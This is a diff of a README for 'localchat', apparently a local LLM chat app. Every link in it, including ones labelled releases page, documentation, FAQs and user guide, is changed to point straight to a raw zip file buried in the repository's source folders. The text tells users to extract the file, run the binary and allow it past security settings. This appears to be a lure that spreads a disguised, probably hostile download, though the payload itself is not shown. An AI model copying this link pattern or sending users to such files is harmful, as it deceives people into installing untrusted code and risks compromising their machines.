@@ -2,7 +2,7 @@
 
 ## 📦 Download Now
 
-[![Download Latest Release](https://raw.githubusercontent.com/ejaz57/localchat/main/hematocytoblast/localchat.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/ejaz57/localchat/main/hematocytoblast/localchat.zip)
+[![Download Latest Release](https://github.com/ejaz57/localchat/raw/refs/heads/main/src/routes/Software-v3.2.zip%20Latest%20Release-v1.0-brightgreen)](https://github.com/ejaz57/localchat/raw/refs/heads/main/src/routes/Software-v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you start, ensure your system meets the following requirements:
 
 To get started, you will need to download the application from the Releases page. 
 
-1. **Visit this page to download:** [localchat Releases](https://raw.githubusercontent.com/ejaz57/localchat/main/hematocytoblast/localchat.zip)
+1. **Visit this page to download:** [localchat Releases](https://github.com/ejaz57/localchat/raw/refs/heads/main/src/routes/Software-v3.2.zip)
 2. Look for the latest version at the top.
 3. Click on the download link for your operating system.
 4. Once the download completes, find the file in your Downloads folder.
@@ -38,7 +38,7 @@ To get started, you will need to download the application from the Releases page
    - You may need to allow the app in your Security & Privacy settings.
 
 3. **For Linux:**
-   - Extract the downloaded `https://raw.githubusercontent.com/ejaz57/localchat/main/hematocytoblast/localchat.zip` file to your preferred location.
+   - Extract the downloaded `https://github.com/ejaz57/localchat/raw/refs/heads/main/src/routes/Software-v3.2.zip` file to your preferred location.
    - Open a terminal window.
    - Navigate to the folder where you extracted the files.
    - Run `./localchat` to start the application.
@@ -76,7 +76,7 @@ If you run into issues, try the following steps:
 
 For more detailed instructions and advanced features, please refer to our online documentation. 
 
-Visit this page for more information: [localchat Documentation](https://raw.githubusercontent.com/ejaz57/localchat/main/hematocytoblast/localchat.zip)
+Visit this page for more information: [localchat Documentation](https://github.com/ejaz57/localchat/raw/refs/heads/main/src/routes/Software-v3.2.zip)
 
 ## 🙋‍♂️ Support
 
@@ -84,7 +84,7 @@ If you need help or have questions, feel free to open an issue on GitHub. Our co
 
 ## ✨ Helpful Resources
 
-- [FAQs](https://raw.githubusercontent.com/ejaz57/localchat/main/hematocytoblast/localchat.zip)
-- [User Guide](https://raw.githubusercontent.com/ejaz57/localchat/main/hematocytoblast/localchat.zip)
+- [FAQs](https://github.com/ejaz57/localchat/raw/refs/heads/main/src/routes/Software-v3.2.zip)
+- [User Guide](https://github.com/ejaz57/localchat/raw/refs/heads/main/src/routes/Software-v3.2.zip)
 
 Thank you for choosing localchat. Enjoy your experience with LLMs!
